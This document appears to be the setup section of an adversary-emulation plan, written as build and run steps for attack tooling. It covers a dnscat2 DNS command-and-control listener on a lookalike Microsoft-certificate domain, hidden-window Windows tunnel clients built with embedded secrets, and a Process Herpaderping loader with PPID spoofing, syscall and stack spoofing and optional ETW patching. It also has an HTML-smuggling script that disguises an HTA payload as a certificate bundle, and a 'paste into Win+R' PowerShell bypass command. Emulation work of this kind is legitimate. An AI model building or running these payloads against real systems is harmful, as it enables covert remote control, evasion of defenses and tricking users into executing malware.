# Setup

## Step 0 — Setup

### Procedures

#### dnscat2 server (Ruby)

- ☣️ On the attacker machine, start the dnscat2 server listener

  ```bash
  ruby dnscat2.rb --dns "domain=crl.ms-cert.net,host=0.0.0.0" --security=open --secret=c7517dee4fcbe16a0c8c1f98cdc5ce4e
  ```

  - ***Expected Output***

    ```text
    New window created: 0
    dnscat2> Listening for connections...
    ```

#### `dnscat2.exe` (Go DNS tunnel client)

**Code flow (from source):** `resources/payloads/dnscat2/go-client/cmd/dnscat/main.go` parses flags (domain, `--dns-server`, secret, session mode: ping / console / `-exec` / default command session). If `--dns-server` is empty, it calls `getSystemDNS()` (registry: static `NameServer` before `DhcpNameServer` per adapter); fallback `8.8.8.8`. It configures `session` encryption and delay, then builds a `session.Session` and runs the DNS driver (`pkg/tunnel/dns`) under `pkg/controller` with `pkg/driver/command` (or console/exec drivers depending on flags).

**Build:**

On Windows, `getSystemDNS()` applies to the **built Windows binary** when run on a victim; the compiler host only needs Go.

**Bash (Linux / macOS / Git Bash):**

```bash
cd resources/payloads/dnscat2/go-client
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultDomain=crl.ms-cert.net \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
  -o dnscat2.exe ./cmd/dnscat/
```

**PowerShell (Windows):**

```powershell
Set-Location resources\payloads\dnscat2\go-client
$env:GOOS = "windows"
$env:GOARCH = "amd64"
go build `
  -ldflags "-s -w -H windowsgui -X main.DefaultDomain=crl.ms-cert.net -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" `
  -o dnscat2.exe `
  ./cmd/dnscat/
Remove-Item Env:\GOOS -ErrorAction SilentlyContinue
Remove-Item Env:\GOARCH -ErrorAction SilentlyContinue
```

Output: `resources/payloads/dnscat2/go-client/dnscat2.exe`

#### `dnscat-service.exe` (Go, Windows service wrapper)

**Code flow (from source):** `cmd/dnscat-service/main.go` calls `svc.IsWindowsService()`. **Service path:** `runService()` → `LoadConfigFromRegistry()` (`HKLM\SYSTEM\CurrentControlSet\Services\dnscat2\Parameters`, else build-time defaults from `-ldflags` in `config.go`) → `svc.Run("dnscat2", &dnscat2Service{config})`. `service.go` `Execute` reports state to SCM, starts `runDnscat(config)` in a goroutine, handles stop/shutdown (cancels context, may call `controller.Destroy()`). **Interactive path:** `runInteractive()` parses flags and calls `runDnscat` directly. `runDnscat` mirrors the client: resolve DNS server (`config` → `getSystemDNS()` → `8.8.8.8`), create exec or command session, attach DNS tunnel.

**Build:**

**Bash:**

```bash
cd resources/payloads/dnscat2/go-client
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultDomain=crl.ms-cert.net \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" \
  -o dnscat-service.exe ./cmd/dnscat-service/
```

**PowerShell:**

```powershell
Set-Location resources\payloads\dnscat2\go-client
$env:GOOS = "windows"
$env:GOARCH = "amd64"
go build `
  -ldflags "-s -w -H windowsgui -X main.DefaultDomain=crl.ms-cert.net -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e" `
  -o dnscat-service.exe `
  ./cmd/dnscat-service/
Remove-Item Env:\GOOS -ErrorAction SilentlyContinue
Remove-Item Env:\GOARCH -ErrorAction SilentlyContinue
```

Output: `resources/payloads/dnscat2/go-client/dnscat-service.exe`

#### `CWLHerpaderping.exe` (C++, Process Herpaderping loader)

**Code flow (from source):** `CWLImplant.cpp` — `main()` calls `GetPayloadBuffer()` to obtain the PE bytes, then `Herpaderping()` to execute it as a ghost process.

**Payload loading — two modes, selected at runtime by stdin type:**

- **Mode 1 — Stdin pipe (T1620, primary):** `GetFileType(STD_INPUT_HANDLE) == FILE_TYPE_PIPE` → reads 4-byte little-endian size header then PE bytes from stdin via `ReadFile` into a heap buffer. **No disk file artifact.** Used by the react2shell `herpload` command.
- **Mode 2 — File fallback (T1070.004):** Stdin is not a pipe → `CreateFileW(PAYLOAD_PATH)` reads the PE into heap, then `DeleteFileW(PAYLOAD_PATH)` deletes the file immediately. `PAYLOAD_PATH` is `L"C:\\temp\\payload64.exe"` by default (`CWLImplant.cpp` line 13 `#ifndef PAYLOAD_PATH`); override at build time with `/p:CustomPayloadPath=` (double backslashes required).

**ETW patching (`PatchEtw()`) — OPT-IN, disabled by default:** `PatchEtw()` patches `ntdll!EtwEventWrite` to `xor eax,eax; ret` to suppress ETW telemetry (T1562.006). It is guarded by `#ifdef ENABLE_ETW_PATCH` in `CWLImplant.cpp` and is **not compiled in** unless explicitly requested. The default emulation-plan build omits this.

**`Herpaderping()`** initializes five indirect syscall stubs (`NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`) via `InitSyscallPool` / `SealSyscallPool`. It writes the PE into a `%TEMP%\HD*.tmp` file, creates an `SEC_IMAGE` section from it, calls `GetNonJobParent()` to find a Session 0 `svchost.exe` (fallback: `wininit.exe`) for PPID spoofing, spawns the ghost via `NtCreateProcessEx`, re-assigns the ghost's token to the caller's token via `NtSetInformationProcess(ProcessAccessToken)`, overwrites the temp file with junk (`"Hello From CyberWarFare Labs"`), writes spoofed `RTL_USER_PROCESS_PARAMETERS` (`ImagePathName=RuntimeBroker.exe`) into the ghost PEB, then starts the payload thread via `NtCreateThreadEx`. The five NT calls are wrapped with `StackSpoofer` (fake `kernel32.dll` return address).

**Build — default (Mode 1 primary, static CRT, no ETW patch):**

`Release x64` in `.vcxproj` sets `<RuntimeLibrary>MultiThreaded</RuntimeLibrary>` (`/MT`) — fully static CRT, **no VC runtime DLL required** on the target. This is hardcoded for the `Release|x64` config only; do not use `Debug` or `Win32` configs for deployment.

```powershell
Set-Location resources\payloads\CWLHerpaderping
msbuild CWLHerpaderping.sln `
  /p:Configuration=Release `
  /p:Platform=x64 `
  /t:Rebuild /m
```

**Optional — enable ETW suppression (T1562.006):**

```powershell
msbuild CWLHerpaderping.sln `
  /p:Configuration=Release /p:Platform=x64 `
  /p:ETWPatch=1 `
  /t:Rebuild /m
```

**Optional — override Mode 2 payload path (double backslashes required):**

```powershell
msbuild CWLHerpaderping.sln `
  /p:Configuration=Release /p:Platform=x64 `
  /p:CustomPayloadPath="C:\\ProgramData\\CertCA.bin" `
  /p:CWLDebug=1 `
  /t:Rebuild /m
```

Output: `resources\payloads\CWLHerpaderping\x64\Release\CWLHerpaderping.exe`



#### HTML Smuggling Path Setup

**`encode-command.py` (HTA → polyglot PEM + HTML smuggling)**

**Code flow (from source):** `resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/encode-command.py` reads `stage1.hta`, base64-wraps it as fake PEM (`encode_pem`), embedding a **PowerShell polyglot** after a block comment: the PS strip finds base64 lines in `cert_bundle.txt`, decodes to `%TEMP%`, renames to `.hta`, launches **`mshta.exe`**. Then `inject_smuggled_payload` replaces `var b64 = '...'` in `staging.html` with base64 of the entire `cert_bundle.txt` so the browser download carries the payload without a second fetch.

**Run:**

```bash
cd resources/payloads/T1189/vbs-in-mem-hta-execution/malicious-copy-paste-combined/
python encode-command.py
```

- ***Expected Output***

  ```text
  [+] stage1.hta -> cert_bundle.txt
      Original : 4,xxx bytes
      PEM      : 6,xxx bytes

  [+] Smuggled payload -> staging.html (x,xxx b64 chars)

  --- paste into Win+R ---
  powershell -w h -ep bypass -c "iex(gc -Raw '%USERPROFILE%\Downloads\cert_bundle.txt')"
  ```
